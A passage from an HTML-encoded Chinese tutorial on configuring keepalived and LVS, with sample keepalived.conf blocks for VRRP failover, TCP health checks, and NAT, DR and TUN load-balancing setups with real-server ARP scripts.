#&#x8BBE;&#x7F6E;lvs&#x7684;&#x6A21;&#x5F0F;persistence_timeout 60   #&#x4F1A;&#x8BDD;&#x4FDD;&#x6301;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x79D2;protocol TCP       #ip&#x5305;&#x8F6C;&#x53D1;&#x534F;&#x8BAE;&#xFF0C;&#x6709;TCP&#x548C;UDP&#x4E24;&#x79CD;real_server 10.95.0.143 80   #real server &#x7684;ip{  weight 3           #&#x6743;&#x91CD;  TCP_CHECK           #&#x5065;&#x5EB7;&#x68C0;&#x67E5;  {    connect_timeout 10       #&#x8868;&#x793A;&#x65E0;&#x54CD;&#x5E94;&#x8D85;&#x65F6;&#x65F6;&#x95F4;    nb_get_retry 3           #&#x8868;&#x793A;&#x91CD;&#x8FDE;&#x6B21;&#x6570;    delay_before_retry 3       #&#x8868;&#x793A;&#x91CD;&#x8BD5;&#x95F4;&#x9694;    connect_port 80           #&#x8868;&#x793A;&#x7AEF;&#x53E3;  }}real_server 10.95.0.144 80{  weight 3  TCP_CHECK  {    connect_timeout 10    nb_get_retry 3    delay_before_retry 3    connect_port 80  }}}2&#x3001;keepalived&#x7684;&#x5FC3;&#x8DF3;&#x68C0;&#x6D4B;</code></pre><p>&#x5065;&#x5EB7;&#x76D1;&#x6D4B;&#x5E94;&#x8BB8;&#x591A;&#x79CD;&#x68C0;&#x67E5;&#x65B9;&#x5F0F;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x6709;&#xFF0C;HTTP_GET&#xFF0C;SSL_GET&#xFF0C;TCP_CHECK&#xFF0C;SMTP_CHECK&#xFF0C;MISC_CHECK.</p><pre><code class="ini">TCP_CHECK { conetct_port 80 connect_timeout 3 nb_get_retry 3 delay_before_retry 3}connect_port:&#x5065;&#x5EB7;&#x68C0;&#x67E5;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6307;&#x5B9A;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;real_server&#x6307;&#x5B9A;&#x7684;&#x7AEF;&#x53E3;connect_timeout:&#x8868;&#x793A;&#x65E0;&#x54CD;&#x5E94;&#x8D85;&#x65F6;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x79D2;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;3snb_get_retry&#xFF1A;&#x8868;&#x793A;&#x91CD;&#x8BD5;&#x6B21;&#x6570;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;3cidelay_before_retry&#xFF1A;&#x8868;&#x793A;&#x91CD;&#x8BD5;&#x95F4;&#x9694;&#xFF0C;HTTP_GET |SSL_GET{ url{   path /index.html  #&#x6307;&#x5B9A;url&#x4FE1;&#x606F;   digest e6owjfdsjfalsjdfsalkf30wfdsfjwqe     #ssl&#x68C0;&#x67E5;&#x540E;&#x7684;&#x6458;&#x8981;&#x4FE1;&#x606F;&#xFF0C;&#x8FD9;&#x4E9B;&#x6458;&#x8981;&#x4FE1;&#x606F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;genhash&#x547D;&#x4EE4;&#x5DE5;&#x5177;&#x83B7;&#x53D6;&#xFF0C;     #&#x4F8B;&#xFF1A;genhash -s 192.168.12.80 -p 80 -u /index.html   status_code 200  } connect_port 80 bindto 192.168.31.128    #&#x8868;&#x793A;&#x901A;&#x8FC7;&#x6B64;&#x5730;&#x5740;&#x6765;&#x5BF9;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x5065;&#x5EB7;&#x68C0;&#x67E5; nb_get_retry 3 delay_before_retry 2}</code></pre><p><strong>&#xFF01;&#x5728;&#x914D;&#x7F6E;keepalived.conf&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6B63;&#x786E;&#x6027;&#xFF0C;&#x56E0;&#x4E3A;keepalived&#x5728;&#x91CD;&#x542F;&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6B63;&#x786E;&#x6027;&#xFF0C;&#x5373;&#x4F7F;&#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;keepalived&#x7167;&#x6837;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x5B9A;&#x8981;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x6B63;&#x786E;</strong></p><h3 id="&#x5168;&#x5C40;&#x5B9A;&#x4E49;"><a href="#&#x5168;&#x5C40;&#x5B9A;&#x4E49;" class="headerlink" title="&#x5168;&#x5C40;&#x5B9A;&#x4E49;"></a>&#x5168;&#x5C40;&#x5B9A;&#x4E49;</h3><p>&#x5168;&#x5C40;&#x914D;&#x7F6E;&#x53C8;&#x5305;&#x62EC;&#x4E24;&#x4E2A;&#x5B50;&#x914D;&#x7F6E;</p><ul><li>&#x5168;&#x5C40;&#x5B9A;&#x4E49;(global definition)</li><li>&#x9759;&#x6001;&#x8DEF;&#x7531;&#x914D;&#x7F6E;(static ipaddress/routes)</li></ul><pre><code class="ini"># &#x5168;&#x5C40;&#x5B9A;&#x4E49;# &#x5168;&#x5C40;&#x5B9A;&#x4E49; (global definition) global_defs {                         notification_email {         acassen@firewall.loc        failover@firewall.loc   sysadmin@firewall.loc   }   notification_email_from Alexandre.Cassen@firewall.loc      smtp_server 192.168.200.1                            smtp_connect_timeout 30                                     router_id LVS_DEVEL     }notification_email: &#x8868;&#x793A; keepalived &#x5728;&#x53D1;&#x751F;&#x8BF8;&#x5982;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#x65F6;&#x9700;&#x8981;&#x53D1;&#x9001; email &#x901A;&#x77E5;&#x4EE5;&#x53CA; email &#x53D1;&#x9001;&#x7ED9;&#x54EA;&#x4E9B;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#x53EF;&#x4EE5;&#x591A;&#x4E2A;&#x6BCF;&#x884C;&#x4E00;&#x4E2A;notification_email_from admin@example.com: &#x8868;&#x793A;&#x53D1;&#x9001;&#x901A;&#x77E5;&#x90AE;&#x4EF6;&#x65F6;&#x90AE;&#x4EF6;&#x6E90;&#x5730;&#x5740;&#x662F;&#x8C01;smtp_server 127.0.0.1: &#x8868;&#x793A;&#x53D1;&#x9001; email &#x65F6;&#x4F7F;&#x7528;&#x7684; smtp &#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;&#x672C;&#x5730;&#x7684; sendmail &#x6765;&#x5B9E;&#x73B0;smtp_connect_timeout 30: &#x8FDE;&#x63A5; smtp &#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x65F6;&#x95F4;router_id node1: &#x673A;&#x5668;&#x6807;&#x8BC6;&#xFF0C;&#x901A;&#x5E38;&#x914D;&#x7F6E;&#x4E3B;&#x673A;&#x540D;# &#x9759;&#x6001;&#x5730;&#x5740;&#x548C;&#x8DEF;&#x7531;&#x914D;&#x7F6E;&#x8303;&#x4F8B;static_ipaddress {    192.168.1.1/24 brd + dev eth0 scope global    192.168.1.2/24 brd + dev eth1 scope global}static_routes {    src $SRC_IP to $DST_IP dev $SRC_DEVICE    src $SRC_IP to $DST_IP via $GW dev $SRC_DEVICE} &#x8FD9;&#x91CC;&#x5B9E;&#x9645;&#x4E0A;&#x548C;&#x7CFB;&#x7EDF;&#x91CC;&#x9762;&#x547D;&#x4EE4;&#x914D;&#x7F6E; IP &#x5730;&#x5740;&#x548C;&#x8DEF;&#x7531;&#x4E00;&#x6837;&#x4F8B;&#x5982; 192.168.1.1/24 brd + dev eth0 scope global &#x76F8;&#x5F53;&#x4E8E;: ip addr add 192.168.1.1/24 brd + dev eth0 scope global &#x5C31;&#x662F;&#x7ED9; eth0 &#x914D;&#x7F6E; IP &#x5730;&#x5740;&#x8DEF;&#x7531;&#x540C;&#x7406;, &#x4E00;&#x822C;&#x8FD9;&#x4E2A;&#x533A;&#x57DF;&#x4E0D;&#x9700;&#x8981;&#x914D;&#x7F6E;  &#x8FD9;&#x91CC;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x771F;&#x5B9E;&#x7684; IP &#x5730;&#x5740;&#x548C;&#x8DEF;&#x7531;&#x7684;&#x5728;&#x590D;&#x6742;&#x7684;&#x73AF;&#x5883;&#x4E0B;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x7528;&#x8FD9;&#x4E2A;&#x6765;&#x914D;&#x7F6E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x7528; vi /etc/sysconfig/network-script/ifcfg-eth1 &#x6765;&#x914D;&#x7F6E;&#x5207;&#x8BB0;&#x8FD9;&#x91CC;&#x53EF;&#x4E0D;&#x662F; VIP &#x4E0D;&#x8981;&#x641E;&#x6DF7;&#x6DC6;&#x4E86;&#x5207;&#x8BB0;&#x5207;&#x8BB0;</code></pre><h3 id="VRRPD&#x914D;&#x7F6E;"><a href="#VRRPD&#x914D;&#x7F6E;" class="headerlink" title="VRRPD&#x914D;&#x7F6E;"></a>VRRPD&#x914D;&#x7F6E;</h3><p>&#x5305;&#x62EC;&#x4E09;&#x4E2A;&#x7C7B;&#xFF1A;</p><ol><li>VRRP&#x540C;&#x6B65;&#x7EC4;&#xFF08;synchroization group)</li><li>VRRP&#x5B9E;&#x4F8B;&#xFF08;VRRP Instance)</li><li>VRRP&#x811A;&#x672C;</li></ol><pre><code class="ini"># VRRP &#x540C;&#x6B65;&#x7EC4; (synchroization group) &#x914D;&#x7F6E;&#x8303;&#x4F8B; vrrp_sync_group VG_1 {   // &#x6CE8;&#x610F; vrrp_sync_group  &#x540E;&#x9762;&#x53EF;&#x81EA;&#x5B9A;&#x4E49;&#x540D;&#x79F0;&#x5982; lvs_httpd ,httpdgroup {    http    mysql}notify_master /path/to/to_master.shnotify_backup /path_to/to_backup.shnotify_fault &quot;/path/fault.sh VG_1&quot;notify /path/to/notify.shsmtp_alert } &#x5176;&#x4E2D; http &#x548C; mysql &#x662F;&#x5B9E;&#x4F8B;&#x540D;&#x548C;&#x4E0B;&#x9762;&#x7684;&#x5B9E;&#x4F8B;&#x540D;&#x4E00;&#x81F4; notify_master /path/to/to_master.sh // &#x8868;&#x793A;&#x5F53;&#x5207;&#x6362;&#x5230; master &#x72B6;&#x6001;&#x65F6;&#x8981;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;notify_backup /path_to/to_backup.sh // &#x8868;&#x793A;&#x5F53;&#x5207;&#x6362;&#x5230; backup &#x72B6;&#x6001;&#x65F6;&#x8981;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;notify_fault &quot;/path/fault.sh VG_1&quot;  // keepalived &#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#x6267;&#x884C;&#x7684;&#x811A;&#x672C;notify /path/to/notify.sh  smtp_alert           // &#x8868;&#x793A;&#x5207;&#x6362;&#x65F6;&#x7ED9; global defs &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x90AE;&#x4EF6;&#x5730;&#x5740;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x901A;&#x77E5;# VRRP &#x5B9E;&#x4F8B;(instance) &#x914D;&#x7F6E;&#x8303;&#x4F8B;vrrp_instance http {  // &#x6CE8;&#x610F; vrrp_instance &#x540E;&#x9762;&#x53EF;&#x81EA;&#x5B9A;&#x4E49;&#x540D;&#x79F0;&#x5982; lvs_httpd ,httpdstate MASTERinterface eth0dont_track_primarytrack_interface {eth0eth1}mcast_src_ip &lt;IPADDR&gt;garp_master_delay 10virtual_router_id 51priority 100advert_int 1authentication {auth_type PASSautp_pass 1234}virtual_ipaddress {#&lt;IPADDR&gt;/&lt;MASK&gt; brd &lt;IPADDR&gt; dev &lt;STRING&gt; scope &lt;SCOPT&gt; label &lt;LABEL&gt;192.168.200.17/24 dev eth1192.168.200.18/24 dev eth2 label eth2:1}virtual_routes {# src &lt;IPADDR&gt; [to] &lt;IPADDR&gt;/&lt;MASK&gt; via|gw &lt;IPADDR&gt; dev &lt;STRING&gt; scope &lt;SCOPE&gt; tabsrc 192.168.100.1 to 192.168.109.0/24 via 192.168.200.254 dev eth1192.168.110.0/24 via 192.168.200.254 dev eth1192.168.111.0/24 dev eth2192.168.112.0/24 via 192.168.100.254}nopreemptpreemtp_delay 300debug}</code></pre><pre><code class="ini"># VRRP &#x811A;&#x672C; # &#x5982;&#x4E0B;&#x6240;&#x793A;&#x4E3A;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x793A;&#x4F8B;vrrp_script check_running {   script &quot;/usr/local/bin/check_running&quot;   interval 10   weight 10}vrrp_instance http {   state BACKUP   smtp_alert   interface eth0   virtual_router_id 101   priority 90   advert_int 3   authentication {   auth_type PASS   auth_pass whatever   }   virtual_ipaddress {   1.1.1.1   }   track_script {   check_running    }}# &#x9996;&#x5148;&#x5728; vrrp_script &#x533A;&#x57DF;&#x5B9A;&#x4E49;&#x811A;&#x672C;&#x540D;&#x5B57;&#x548C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684;&#x95F4;&#x9694;&#x548C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x53D8;&#x66F4;, &#x5982;&#x4E0B;&#x6240;&#x793A;:vrrp_script check_running {            script &quot;/usr/local/bin/check_running&quot;            interval 10     # &#x811A;&#x672C;&#x6267;&#x884C;&#x95F4;&#x9694;            weight 10       # &#x811A;&#x672C;&#x7ED3;&#x679C;&#x5BFC;&#x81F4;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#x53D8;&#x66F4; 10 &#x8868;&#x793A;&#x4F18;&#x5148;&#x7EA7; + 10-10 &#x5219;&#x8868;&#x793A;&#x4F18;&#x5148;&#x7EA7; - 10            }# &#x7136;&#x540E;&#x5728;&#x5B9E;&#x4F8B;(vrrp_instance) &#x91CC;&#x9762;&#x5F15;&#x7528;&#x6709;&#x70B9;&#x7C7B;&#x4F3C;&#x811A;&#x672C;&#x91CC;&#x9762;&#x7684;&#x51FD;&#x6570;&#x5F15;&#x7528;&#x4E00;&#x6837;&#x5148;&#x5B9A;&#x4E49;&#x540E;&#x5F15;&#x7528;&#x51FD;&#x6570;&#x540D;track_script {      check_running }</code></pre><p>&#x6CE8;&#x610F;:<br>VRRP &#x811A;&#x672C; (vrrp_script) &#x548C; VRRP &#x5B9E;&#x4F8B; (vrrp_instance) &#x5C5E;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x7EA7;&#x522B;<br>keepalived &#x4F1A;&#x5B9A;&#x65F6;&#x6267;&#x884C;&#x811A;&#x672C;&#x5E76;&#x5BF9;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x52A8;&#x6001;&#x8C03;&#x6574; vrrp_instance &#x7684;&#x4F18;&#x5148;&#x7EA7;&#x3002;&#x4E00;&#x822C;&#x811A;&#x672C;&#x68C0;&#x6D4B;&#x8FD4;&#x56DE;&#x7684;&#x503C;&#x4E3A; 0&#xFF0C;&#x8BF4;&#x660E;&#x811A;&#x672C;&#x68C0;&#x6D4B;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x4E3A;&#x975E; 0 &#x6570;&#x503C;&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x68C0;&#x6D4B;&#x5931;&#x8D25;<br>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x4E3A; 0&#xFF0C;&#x5E76;&#x4E14; weight &#x914D;&#x7F6E;&#x7684;&#x503C;&#x5927;&#x4E8E; 0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x76F8;&#x5E94;&#x7684;&#x589E;&#x52A0;, &#x5982;&#x679C; weight &#x4E3A;&#x975E; 0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x53D8;<br>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x975E; 0&#xFF0C;&#x5E76;&#x4E14; weight &#x914D;&#x7F6E;&#x7684;&#x503C;&#x5C0F;&#x4E8E; 0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x76F8;&#x5E94;&#x7684;&#x51CF;&#x5C11;, &#x5982;&#x679C; weight &#x4E3A; 0&#xFF0C;&#x5219;&#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x53D8;<br>&#x5176;&#x4ED6;&#x60C5;&#x51B5;&#xFF0C;&#x7EF4;&#x6301;&#x539F;&#x672C;&#x914D;&#x7F6E;&#x7684;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x5373;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D; priority &#x5BF9;&#x5E94;&#x7684;&#x503C;&#x3002;<br>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;<br>1&#xFF09; &#x4F18;&#x5148;&#x7EA7;&#x4E0D;&#x4F1A;&#x4E0D;&#x65AD;&#x7684;&#x63D0;&#x9AD8;&#x6216;&#x8005;&#x964D;&#x4F4E;<br>2&#xFF09; &#x53EF;&#x4EE5;&#x7F16;&#x5199;&#x591A;&#x4E2A;&#x68C0;&#x6D4B;&#x811A;&#x672C;&#x5E76;&#x4E3A;&#x6BCF;&#x4E2A;&#x68C0;&#x6D4B;&#x811A;&#x672C;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684; weight<br>3&#xFF09; &#x4E0D;&#x7BA1;&#x63D0;&#x9AD8;&#x4F18;&#x5148;&#x7EA7;&#x8FD8;&#x662F;&#x964D;&#x4F4E;&#x4F18;&#x5148;&#x7EA7;&#xFF0C;&#x6700;&#x7EC8;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x8303;&#x56F4;&#x662F;&#x5728;[1,254]&#xFF0C;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4F18;&#x5148;&#x7EA7;&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E; 0 &#x6216;&#x8005;&#x4F18;&#x5148;&#x7EA7;&#x5927;&#x4E8E;&#x7B49;&#x4E8E; 255 &#x7684;&#x60C5;&#x51B5;<br>&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x5229;&#x7528;&#x811A;&#x672C;&#x68C0;&#x6D4B;&#x4E1A;&#x52A1;&#x8FDB;&#x7A0B;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5E76;&#x52A8;&#x6001;&#x8C03;&#x6574;&#x4F18;&#x5148;&#x7EA7;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E3B;&#x5907;&#x5207;&#x6362;&#x3002;</p><h3 id="&#x914D;&#x7F6E;&#x5B9E;&#x8DF5;"><a href="#&#x914D;&#x7F6E;&#x5B9E;&#x8DF5;" class="headerlink" title="&#x914D;&#x7F6E;&#x5B9E;&#x8DF5;"></a>&#x914D;&#x7F6E;&#x5B9E;&#x8DF5;</h3><pre><code class="shell"># &#x5173;&#x95ED;&#x9632;&#x706B;&#x5899;systemctl disable firewalldsystemctl stop firewalld# &#x7981;&#x7528; selinuxsetenforce 0vi /etc/selinux/configSELINUX=disabled# &#x5B89;&#x88C5; keepalived,ipvsadmyum install keepalived ipvsadm -y# &#x5F00;&#x542F; LVS &#x670D;&#x52A1;&#x5668;&#x7684; IP &#x8DEF;&#x7531;&#x8F6C;&#x53D1;&#x529F;&#x80FD;echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward# &#x6DFB;&#x52A0;&#x8DEF;&#x7531;&#x8F6C;&#x53D1;&#x81F3; sysctl.confvi /etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p</code></pre><p><strong>&#x6700;&#x7B80;&#x5355;&#x7684; keepalived &#x505A; HA</strong></p><pre><code class="shell"># &#x5982;&#x679C;&#x5F00;&#x542F;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x8BF7;&#x6DFB;&#x52A0; VRRP &#x767D;&#x540D;&#x5355;# For keepalived# allow vrrp-A INPUT -p vrrp -j ACCEPT-A INPUT -p igmp -j ACCEPT# allow multicast-A INPUT -d 224.0.0.18 -j ACCEPT# &#x7F16;&#x8F91; keepalived &#x914D;&#x7F6E;&#x6587;&#x4EF6;vi /etc/keepalived/keepalived.confvrrp_sync_group VI_GOP_NC1_HA {    group {        VI_GOP_NC1_HA_PRI    }}vrrp_instance VI_GOP_NC1_HA_PRI {    state BACKUP    interface bond0    virtual_router_id 139    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        10.65.33.139/23 dev bond0    }}</code></pre><h4 id="&#x914D;&#x7F6E;-LVS-NAT"><a href="#&#x914D;&#x7F6E;-LVS-NAT" class="headerlink" title="&#x914D;&#x7F6E; LVS-NAT"></a>&#x914D;&#x7F6E; LVS-NAT</h4><p>DS</p><pre><code class="shell"># Install keepalived# Ubuntuapt-get install keepalived ipvsadm# CentOSyum install keepalived ipvsadm# update iptablesvim /etc/sysconfig/iptables# For keepalived:# allow vrrp -A INPUT -p vrrp -j ACCEPT-A INPUT -p igmp -j ACCEPT# allow multicast-A INPUT -d 224.0.0.18 -j ACCEPT# reload iptablesservice iptables reload# open ip_forwardecho &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward# edit sysctl.confvi /etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p# keepalived for lvs-natvim /etc/keepalived/keepalived.confvrrp_sync_group NC-MAIN-API {    group {        NC-MAIN-API-PUB    }}vrrp_instance NC-MAIN-API-PUB {    state BACKUP    interface bond1    virtual_router_id 222    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        xx.xx.xx.xx/25 dev bond1    }}virtual_server xx.xx.xx.xx 15000 {    delay_loop 6    lb_algo rr    lb_kind NAT    protocol TCP    real_server 10.71.12.69 15000 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 15000        }    }    real_server 10.71.12.76 15000 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 15000        }    }}</code></pre><p>RS<br>&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x6307;&#x5411; NAT &#x7684; VIP &#x5730;&#x5740;</p><p><strong>&#x914D;&#x7F6E;LVS-DR</strong></p><pre><code class="shell"># Install keepalived# Ubuntuapt-get install keepalived ipvsadm# CentOSyum install keepalived ipvsadm# update iptablesvim /etc/sysconfig/iptables# For keepalived:# allow vrrp -A INPUT -p vrrp -j ACCEPT-A INPUT -p igmp -j ACCEPT# allow multicast-A INPUT -d 224.0.0.18 -j ACCEPT# reload iptablesservice iptables reload# open ip_forwardecho &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward# edit sysctl.confvi /etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p# keepalived for lvs-drvim /etc/keepalived/keepalived.confvrrp_sync_group GOP {    group {        VI_PRI_CONNECT        VI_PRI_AUTH    }}vrrp_instance VI_PRI_CONNECT {    state BACKUP    interface bond0    virtual_router_id 128    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        10.65.32.28/23 dev bond0    }}virtual_server 10.65.32.28 80 {    delay_loop 6    lb_algo rr    lb_kind DR    protocol TCP    real_server 10.65.32.13 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }    real_server 10.65.32.14 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }}virtual_server 10.65.32.28 443 {    delay_loop 6    lb_algo rr    lb_kind DR    protocol TCP    real_server 10.65.32.13 443 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 443        }    }    real_server 10.65.32.14 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 443        }    }}vrrp_instance VI_PRI_AUTH {    state BACKUP    interface bond0    virtual_router_id 129    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111    }    virtual_ipaddress {        10.65.32.29/23 dev bond0    }}virtual_server 10.65.32.29 80 {    delay_loop 6    lb_algo rr    lb_kind DR    protocol TCP    real_server 10.65.32.22 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }    real_server 110.65.32.23 80 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 80        }    }}virtual_server 10.65.32.29 443 {    delay_loop 6    lb_algo rr    lb_kind DR    protocol TCP    real_server 10.65.32.22 443 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 443        }    }    real_server 110.65.32.23 443 {        weight 100        TCP_CHECK {                connect_timeout 3                nb_get_retry 3                delay_before_retry 3                connect_port 443        }    }}# enable and start keepalivedsystemctl start keepalivedsystemctl enable keepalivedwatch ipvsadm -L -n --stats</code></pre><p><strong>RS</strong>  </p><ol><li>Edit &#x201C;/etc/sysconfig/network-scripts/ifcfg-lo&#x201D; to patch bug in Centos 7 (if using Centos 7). Add TYPE=Loopback to the file.</li><li>Add loopback for each Virtual IP on each worker. E.g. first virtual IP create file &#x201C;/etc/sysconfig/network-scripts/ifcfg-lo:0&#x201D;.</li><li>Start adapters if not yet started</li></ol><pre><code class="shell"># add TYPE=Loopbackecho &quot;TYPE=Loopback&quot; &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-lo# add ifcfg-lo:0cat &gt; /etc/sysconfig/network-scripts/ifcfg-lo:0 &lt;&lt; EOFDEVICE=lo:0IPADDR=10.65.32.28NETMASK=255.255.255.255ONBOOT=yesEOF# ifup lo:0ifup lo:0# add real_startcat &gt; /root/real_start.sh &lt;&lt; EOF#!/bin/bashecho &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignoreecho &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announceecho &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignoreecho &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announceEOF# chmod 755chmod 755 /root/real_start.sh# add real.servicecat &gt; /usr/lib/systemd/system/real.service &lt;&lt; EOF[Unit]Description=autostart lvs realAfter=network.target remote-fs.target nss-lookup.target[Service]Type=forkingExecStart=/root/real_start.sh[Install]WantedBy=multi-user.targetEOF# enable servicesystemctl enable real.service# lvs real server examplevim /root/lvs_real.sh#!/bin/bash### BEGIN INIT INFO# Provides:# Default-Start:     2 3 4 5# Default-Stop:      0 1 6# Short-Description: Start realserver# Description:       Start realserver### END INIT INFO# change the VIP to proper valueVIP=10.65.32.28case &quot;$1&quot; in    start)    echo &quot;Start REAL Server&quot;    /sbin/ifconfig lo:0 $VIP broadcast $VIP netmask 255.255.255.255 up    echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore    echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce    echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore    echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce    ;;    stop)    /sbin/ifconfig lo:0 down    echo &quot;Stop REAL Server&quot;    echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore    echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce    echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore    echo &quot;0&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce    ;;    restart)    $0 stop    $0 start    ;;    *)    echo &quot;Usage: $0 {start|stop}&quot;    exit 1    ;;esacexit 0</code></pre><h4 id="&#x914D;&#x7F6E;-LVS-TUN"><a href="#&#x914D;&#x7F6E;-LVS-TUN" class="headerlink" title="&#x914D;&#x7F6E; LVS-TUN"></a>&#x914D;&#x7F6E; LVS-TUN</h4><p><strong>DS</strong></p><pre><code class="shell"># Install keepalived# Ubuntuapt-get install keepalived ipvsadm# CentOSyum install keepalived ipvsadm# update iptablesvim /etc/sysconfig/iptables# For keepalived:# allow vrrp -A INPUT -p vrrp -j ACCEPT-A INPUT -p igmp -j ACCEPT# allow multicast-A INPUT -d 224.0.0.18 -j ACCEPT# reload iptablesservice iptables reload# open ip_forwardecho &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward# edit sysctl.confvi /etc/sysctl.confnet.ipv4.ip_forward = 1sysctl -p# keepalived for lvs-tunvim /etc/keepalived/keepalived.confvrrp_sync_group GOP {    group {        VI_PRI_AUTH    }}vrrp_instance VI_PRI_AUTH {    state BACKUP    interface em1    virtual_router_id 11    priority 100    advert_int 1    nopreempt    authentication {        auth_type PASS        auth_pass 1111  